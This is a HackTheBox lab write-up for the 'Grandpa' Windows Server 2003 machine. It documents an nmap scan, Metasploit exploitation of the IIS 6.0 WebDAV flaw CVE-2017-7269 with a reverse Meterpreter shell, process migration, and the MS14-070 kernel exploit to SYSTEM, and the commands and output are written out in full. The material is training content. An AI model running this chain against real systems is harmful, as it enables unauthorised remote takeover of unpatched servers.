# Grandpa: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Grandpa |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.34.37 |
| **Tools Used** | Nmap, Metasploit (iis_webdav_scstoragepathfromurl, local_exploit_suggester, ms14_070_tcpip_ioctl) |
| **Techniques** | IIS WebDAV Buffer Overflow RCE, Meterpreter Process Migration, Local Kernel Exploit (MS14-070) |
| **CVEs** | CVE-2017-7269, MS14-070 |
| **Date** | June 2026 |

---

## Attack Chain Summary

```
Nmap scan → Port 80 Microsoft IIS 6.0 → CVE-2017-7269 WebDAV buffer overflow →
Metasploit iis_webdav_scstoragepathfromurl → Meterpreter (Network Service context) →
getuid fails → sysinfo → Windows Server 2003 x86 → local_exploit_suggester →
migrate to davcdata.exe → ms14_070_tcpip_ioctl → NT AUTHORITY\SYSTEM →
User flag + Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services running on the target.

```
Hackerpatel007_1@htb[/htb]$ nmap -T4 -F 10.129.34.37 -oN grandpa.nmap
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.34.37
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Thu, 05 Jun 2026 08:14:22 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Output Analysis**

| Port | Service | Version | Notes |
| --- | --- | --- | --- |
| 80 | HTTP | Microsoft IIS 6.0 | Only open port: WebDAV enabled |

Single open port. Microsoft IIS 6.0 with WebDAV enabled is the entire attack surface. IIS 6.0 is an ancient version from the Windows Server 2003 era. A quick CVE search against this exact version and WebDAV reveals **CVE-2017-7269**: a remotely exploitable buffer overflow in the WebDAV `ScStoragePathFromUrl` function that allows unauthenticated remote code execution.

---

## Step 2: Exploitation: CVE-2017-7269 (IIS WebDAV ScStoragePathFromUrl)

**Goal:** Exploit the IIS 6.0 WebDAV buffer overflow to obtain a Meterpreter shell.

**Vulnerability:** CVE-2017-7269 is a stack buffer overflow in the `ScStoragePathFromUrl` function of the IIS 6.0 WebDAV extension. An attacker can send a crafted `PROPFIND` request with an overlong `If:` header value to trigger the overflow and execute arbitrary code: no credentials required. This vulnerability was publicly disclosed in March 2017 and affected every unpatched IIS 6.0 instance worldwide.

A Metasploit module (`exploit/windows/iis/iis_webdav_scstoragepathfromurl`) handles the exploitation cleanly. A standalone PoC also exists on Exploit-DB (EDB-41738) but requires modification to function reliably.

Started Metasploit and configured the module:

```
Hackerpatel007_1@htb[/htb]$ msfconsole -q
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf6 exploit(iis_webdav_scstoragepathfromurl) > set RHOST 10.129.34.37
RHOST => 10.129.34.37
msf6 exploit(iis_webdav_scstoragepathfromurl) > set LHOST 10.10.16.36
LHOST => 10.10.16.36
msf6 exploit(iis_webdav_scstoragepathfromurl) > run
```

Exploit output:

```
[*] Started reverse TCP handler on 10.10.16.36:4909
[*] Sending stage (179267 bytes) to 10.129.34.37
[*] Meterpreter session 2 opened (10.10.16.36:4909 -> 10.129.34.37:1029)

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.

meterpreter > pwd
c:\windows\system32\inetsrv
```

Shell obtained, but `getuid` fails with access denied: the session is running in a heavily restricted IIS worker process context. The Meterpreter session is alive but cannot perform privileged operations until migrated to a more stable process.

---

## Step 3: System Enumeration

**Goal:** Identify OS version and architecture to plan the privilege escalation path.

```
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (Build 3790, Service Pack 2)
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

**Output Analysis**

| Field | Value | Notes |
| --- | --- | --- |
| OS | Windows Server 2003 SP2 | Build 3790: very old, many local exploits applicable |
| Architecture | x86 | Session and OS are both 32-bit: no migration mismatch |
| Meterpreter | x86/windows | Architecture matches: no cross-arch migration needed |

Target is Windows Server 2003 SP2 x86. The session architecture matches the OS: no cross-arch migration concern like Optimum. However, migration is still needed to escape the restricted IIS worker context before running `local_exploit_suggester`.

---

## Step 4: Process Migration to Stable Process

**Goal:** Migrate from the restricted IIS worker process to a stable process running under `NT AUTHORITY\NETWORK SERVICE` to unlock Meterpreter functionality.

Listed running processes to find a suitable migration target:

```
meterpreter > ps

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 368   1468  davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 584   1468  inetsrv.exe        x86   0        NT AUTHORITY\NETWORK SERVICE
 ...
```

`davcdata.exe` is the WebDAV data management process: the only stable process running as `NT AUTHORITY\NETWORK SERVICE` available for migration. Migrated into it:

```
meterpreter > migrate 368
[*] Migrating from 1916 to 368...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

`getuid` now works: the session is stable and operating as `NT AUTHORITY\NETWORK SERVICE`.

---

## Step 5: Local Exploit Enumeration

**Goal:** Identify applicable local privilege escalation exploits for Windows Server 2003 SP2 x86.

Backgrounded the session and ran `local_exploit_suggester`:

```
meterpreter > background
[*] Backgrounding session 2...

msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 2
SESSION => 2
msf6 post(local_exploit_suggester) > run

[*] 10.129.34.37 - Collecting local exploits for x86/windows...
[+] 10.129.34.37 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.34.37 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.34.37 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[*] Running check method for exploit 6 / 6
[*] 10.129.34.37 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 --  ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms14_058_track_popup_menu               Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms14_070_tcpip_ioctl                    Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms15_051_client_copy_image              Yes                      The target appears to be vulnerable.
```

Multiple exploits flagged as applicable. **MS14-070** (`ms14_070_tcpip_ioctl`) is the confirmed working exploit for this configuration: a kernel-level vulnerability in the TCP/IP driver (`tcpip.sys`) that allows elevation to SYSTEM via an `ioctl` call race condition. It is highly reliable on Windows Server 2003 SP2 x86.

---

## Step 6: Privilege Escalation: MS14-070

**Goal:** Exploit MS14-070 to escalate from `NT AUTHORITY\NETWORK SERVICE` to `NT AUTHORITY\SYSTEM`.

Loaded and configured the exploit against the existing session:

```
msf6 > use exploit/windows/local/ms14_070_tcpip_ioctl
msf6 exploit(ms14_070_tcpip_ioctl) > set SESSION 2
SESSION => 2
msf6 exploit(ms14_070_tcpip_ioctl) > set LHOST 10.10.16.36
LHOST => 10.10.16.36
msf6 exploit(ms14_070_tcpip_ioctl) > run
```

Exploit output:

```
[*] Started reverse TCP handler on 10.10.16.36:4521
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (179267 bytes) to 10.129.34.37
[*] Meterpreter session 3 opened (10.10.16.36:4521 -> 10.129.34.37:1033)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`NT AUTHORITY\SYSTEM` obtained.

---

## Step 7: User and Root Flags

**Goal:** Locate and capture both flags.

On Windows Server 2003, user profiles live under `C:\Documents and Settings\` rather than `C:\Users\`.

```
meterpreter > shell
Process 2468 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(c) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32> cd "C:\Documents and Settings"
C:\Documents and Settings> dir

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          Harry
04/12/2017  05:42 PM    <DIR>          LocalService
04/12/2017  05:42 PM    <DIR>          NetworkService
```

User flag from Harry's Desktop:

```
C:\Documents and Settings> type "Harry\Desktop\user.txt"
bdff5ec67c3cff017f2bedc146a5d869
```

Root flag from Administrator's Desktop:

```
C:\Documents and Settings> type "Administrator\Desktop\root.txt"
9359e905a2c35f861f6a57cecf28bb7b
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `bdff5ec67c3cff017f2bedc146a5d869` |
| Root Flag | `9359e905a2c35f861f6a57cecf28bb7b` |

---

## Lessons Learned

**1. IIS version identification directly leads to CVE research.**
Nmap identified `Microsoft-IIS/6.0` in the server header. That single version number is enough to locate CVE-2017-7269 within seconds. Any time a versioned service is exposed: especially one this old: the immediate next step is a targeted CVE search against that exact version string.

**2. A successful exploit does not guarantee a functional shell.**
The initial Meterpreter session was alive but `getuid` failed with access denied. This is a common outcome when landing inside a restricted IIS worker process. The shell is real: it just has no permissions to enumerate itself until migrated to a process with appropriate access. Never assume a failed `getuid` means the exploit failed.

**3. Process selection for migration matters: stability over privilege.**`davcdata.exe` was chosen not because it ran as SYSTEM, but because it was the only stable process available running under `NT AUTHORITY\NETWORK SERVICE`. Migrating into an unstable process risks dropping the session entirely. Stability first, then escalate.

**4. local_exploit_suggester is reliable when architecture matches.**
Unlike the Optimum scenario where a 32-bit Meterpreter landed on a 64-bit OS, Grandpa's x86 session on an x86 OS allowed `local_exploit_suggester` to return accurate results. The module correctly flagged MS14-070 as applicable, saving manual OS build cross-referencing.

**5. MS14-070 is a high-confidence kernel exploit for Windows Server 2003 SP2.**
The TCP/IP `ioctl` race condition is well-understood on this OS version and the Metasploit implementation is reliable. On any Server 2003 SP2 target where `local_exploit_suggester` returns this module, it should be the first attempt before trying less reliable options.

**6. Windows Server 2003 uses a different profile path.**
Flags and user data live under `C:\Documents and Settings\<username>\Desktop\`: not `C:\Users\`. A common mistake after owning a 2003 box is navigating to `C:\Users` and finding nothing. Always check the OS version in `sysinfo` and adjust file paths accordingly.

---

## Full Attack Chain Reference

1. Ran `nmap -T4 -F`: identified Microsoft IIS 6.0 on port 80, WebDAV enabled
2. Researched IIS 6.0 WebDAV: found CVE-2017-7269 (ScStoragePathFromUrl buffer overflow)
3. Loaded `exploit/windows/iis/iis_webdav_scstoragepathfromurl` in Metasploit
4. Set `RHOST 10.129.34.37` and `LHOST 10.10.16.36`: ran exploit
5. Meterpreter session opened: `getuid` failed (restricted IIS worker context)
6. Ran `sysinfo`: confirmed Windows Server 2003 SP2, x86 architecture
7. Ran `ps`: identified `davcdata.exe` as stable process under NETWORK SERVICE
8. Ran `migrate 368`: session now functional as `NT AUTHORITY\NETWORK SERVICE`
9. Backgrounded session: ran `local_exploit_suggester`
10. Confirmed MS14-070 as applicable: `ms14_070_tcpip_ioctl`
11. Loaded exploit, set `SESSION 2`: ran against existing session
12. New Meterpreter session opened as `NT AUTHORITY\SYSTEM`
13. Navigated to `C:\Documents and Settings\Harry\Desktop`: captured user flag
14. Navigated to `C:\Documents and Settings\Administrator\Desktop`: captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -T4 -F 10.129.34.37 -oN grandpa.nmap` | Fast scan: version detection on common ports |
| `use exploit/windows/iis/iis_webdav_scstoragepathfromurl` | Load CVE-2017-7269 WebDAV exploit |
| `set RHOST 10.129.34.37` | Set target IP |
| `set LHOST 10.10.16.36` | Set attacker IP for reverse callback |
| `run` | Execute exploit: opens Meterpreter session |
| `getuid` | Confirm current process user context |
| `sysinfo` | Identify OS version, build, and architecture |
| `ps` | List running processes for migration selection |
| `migrate <PID>` | Move into stable process to restore Meterpreter functionality |
| `background` | Send session to background for post-module use |
| `use post/multi/recon/local_exploit_suggester` | Enumerate applicable local privilege escalation modules |
| `set SESSION 2` | Attach post module to existing session |
| `use exploit/windows/local/ms14_070_tcpip_ioctl` | Load MS14-070 TCP/IP kernel exploit |
| `type "C:\Documents and Settings\Harry\Desktop\user.txt"` | Read user flag (Server 2003 path) |
| `type "C:\Documents and Settings\Administrator\Desktop\root.txt"` | Read root flag |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Exploit Public-Facing Application | T1190 | CVE-2017-7269 unauthenticated WebDAV RCE against IIS 6.0 |
| Process Injection / Migration | T1055 | Meterpreter migration from restricted IIS worker to davcdata.exe |
| Exploitation for Privilege Escalation | T1068 | MS14-070 tcpip.sys ioctl race condition → SYSTEM |